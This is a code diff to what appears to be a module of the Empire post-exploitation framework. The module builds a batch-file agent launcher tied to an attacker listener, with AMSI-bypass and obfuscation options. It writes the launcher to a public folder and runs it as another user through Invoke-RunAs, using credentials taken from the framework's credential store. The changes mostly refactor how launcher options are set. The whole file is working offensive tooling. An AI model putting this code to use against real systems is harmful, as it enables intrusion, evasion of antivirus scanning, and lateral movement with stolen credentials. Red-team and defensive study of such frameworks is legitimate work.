@@ -10,8 +10,8 @@ from empire.server.common.module_models import PydanticModule
 
 class Module(object):
     @staticmethod
-    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
-        # read in the common powerup.ps1 module source code
+    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False,
+                 obfuscation_command: str = ""):
         module_source = main_menu.installPath + "/data/module_source/management/Invoke-RunAs.ps1"
         if obfuscate:
             helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
@@ -28,12 +28,13 @@ class Module(object):
         # if a credential ID is specified, try to parse
         cred_id = params["CredID"]
         if cred_id != "":
-            
+
             if not main_menu.credentials.is_credential_valid(cred_id):
                 print(helpers.color("[!] CredID is invalid!"))
                 return ""
 
-            (cred_id, cred_type, domain_name, user_name, password, host, os, sid, notes) = main_menu.credentials.get_credentials(cred_id)[0]
+            (cred_id, cred_type, domain_name, user_name, password, host, os, sid, notes) = \
+            main_menu.credentials.get_credentials(cred_id)[0]
 
             if domain_name != "":
                 params["Domain"] = domain_name
@@ -44,40 +45,46 @@ class Module(object):
 
         # extract all of our options
 
-        
-        l = main_menu.stagers.stagers['windows/launcher_bat']
-        l.options['Listener'] = params['Listener']
-        l.options['UserAgent'] = params['UserAgent']
-        l.options['Proxy'] = params['Proxy']
-        l.options['ProxyCreds'] = params['ProxyCreds']
-        l.options['Delete'] = "True"
+        launcher = main_menu.stagers.stagers['windows/launcher_bat']
+        launcher.options['Listener']['Value'] = params['Listener']
+        launcher.options['UserAgent']['Value'] = params['UserAgent']
+        launcher.options['Proxy']['Value'] = params['Proxy']
+        launcher.options['ProxyCreds']['Value'] = params['ProxyCreds']
+        launcher.options['Delete']['Value'] = 'True'
         if (params['Obfuscate']).lower() == 'true':
-            l.options['Obfuscate'] = 'True'
-        l.options['ObfuscateCommand'] = params['ObfuscateCommand']
+            launcher.options['Obfuscate']['Value'] = 'True'
+            launcher.options['ObfuscateCommand']['Value'] = params['ObfuscateCommand']
+        else:
+            launcher.options['Obfuscate']['Value'] = 'False'
         if (params['AMSIBypass']).lower() == 'true':
-            l.options['AMSIBypass'] = 'True'
+            launcher.options['AMSIBypass']['Value'] = 'True'
+        else:
+            launcher.options['AMSIBypass']['Value'] = 'False'
         if (params['AMSIBypass2'].lower() == 'true'):
-            l.options['AMSIBypass2'] = 'True'
-        launcher_code = l.generate()
+            launcher.options['AMSIBypass2']['Value'] = 'True'
+        else:
+            launcher.options['AMSIBypass2']['Value'] = 'False'
+        launcher_code = launcher.generate()
 
         # PowerShell code to write the launcher.bat out
         script_end = "$tempLoc = \"$env:public\debug.bat\""
         script_end += "\n$batCode = @\"\n" + launcher_code + "\"@\n"
         script_end += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
         script_end += "\"Launcher bat written to $tempLoc `n\";\n"
-  
+
         script_end += "\nInvoke-RunAs "
-        script_end += "-UserName %s " %(params["UserName"])
-        script_end += "-Password %s " %(params["Password"])
+        script_end += "-UserName %s " % (params["UserName"])
+        script_end += "-Password '%s' " % (params["Password"])
 
         domain = params["Domain"]
-        if(domain and domain != ""):
-            script_end += "-Domain %s " %(domain)
+        if (domain and domain != ""):
+            script_end += "-Domain %s " % (domain)
 
         script_end += "-Cmd \"$env:public\debug.bat\""
 
         if obfuscate:
-            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
+            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end,
+                                           obfuscationCommand=obfuscation_command)
         script += script_end
         script = helpers.keyword_obfuscation(script)
 
